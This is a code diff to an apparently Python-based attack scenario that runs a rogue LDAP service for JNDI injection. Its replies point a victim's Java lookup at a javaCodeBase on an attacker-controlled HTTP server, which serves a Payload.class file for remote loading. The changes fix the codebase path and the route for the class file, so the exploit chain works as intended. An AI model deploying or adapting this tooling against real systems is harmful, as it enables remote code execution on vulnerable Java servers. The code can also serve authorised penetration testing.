@@ -111,7 +111,7 @@ class JNDI(services.Service):
         query_name = query[9:9 + query[8:][0]].decode()
         response = LDAPResponse(query_name, {
             "javaClassName": "Payload",
-            "javaCodeBase": "http://{rhost}:{rport}/payload".format(**self.scenario.context),
+            "javaCodeBase": "http://{rhost}:{rport}/".format(**self.scenario.context), ## Path must be end with '/'
             "objectClass": "javaNamingReference",
             "javaFactory": "Payload"
         })
@@ -153,13 +153,12 @@ if __name__ == "__main__":
     }
 
     story = scenarios.Scenario(**context)
-    # story.set_proxy('http://127.0.0.1:8088')
+    #story.set_proxy('http://127.0.0.1:8088')
 
     httpd = services.simple.http.HTTPStatic(story, address=context['rhost'], port=context['rport'])
     httpd.add_route('/', 'Welcome')
     payload_path = pathlib.Path(pathlib.Path.cwd(), 'Payload.class')
-    httpd.add_route('/payload', open(payload_path, 'rb').read())
-    httpd.set_event('run', when=triggers.PathContains('send-requests'))
+    httpd.add_route('/Payload.class', open(payload_path, 'rb').read())
 
     story.set_debug()
     for port in JNDI_PORTS:
